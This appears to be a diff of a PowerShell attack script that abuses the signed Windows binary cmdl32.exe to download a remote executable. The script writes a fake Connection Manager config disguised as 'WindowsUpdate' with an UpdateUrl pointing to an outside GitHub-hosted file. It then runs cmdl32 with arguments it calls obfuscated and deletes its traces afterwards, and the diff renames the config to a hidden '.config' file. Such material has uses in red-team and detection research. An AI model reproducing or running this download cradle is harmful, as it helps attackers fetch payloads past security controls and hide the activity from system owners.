@@ -20,13 +20,13 @@ Write-Host "[*] Creating VPN settings file"
 # Define settings file content
 $settingsContent = @"
 [Connection Manager]
-CMSFile=settings.txt
+CMSFile=.config
 ServiceName=WindowsUpdate
-TunnelFile=settings.txt
+TunnelFile=.config
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
 "@
-Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
+Set-Content -Path "$tempDir\.config" -Value $settingsContent
 
 Write-Host "[*] Performing download with cmdl32 via cmd.exe"
 
@@ -42,7 +42,7 @@ if (!(Test-Path -Path $cmdl32Path)) {
 Write-Host "[*] Using cmdl32.exe at: $cmdl32Path"
 
 # Define the arguments with obfuscation using quotes within the command
-$arguments = "/c $cmdl32Path /vpn /l`"a`"n `"$tempDir\settings.txt`""
+$arguments = "/c $cmdl32Path /vpn /lan `"$tempDir\.config`""
 
 Write-Host "[*] Starting cmd.exe with obfuscated arguments: $arguments"
 
@@ -102,5 +102,5 @@ if (Test-Path "$tempDir\whois.exe") {
 
 Write-Host "[*] Cleaning up downloaded file"
 Remove-Item -Path "$tempDir\whois.exe" -Force
-Remove-Item -Path "$tempDir\settings.txt" -Force
+Remove-Item -Path "$tempDir\.config" -Force
 Write-Host "[*] Script complete."
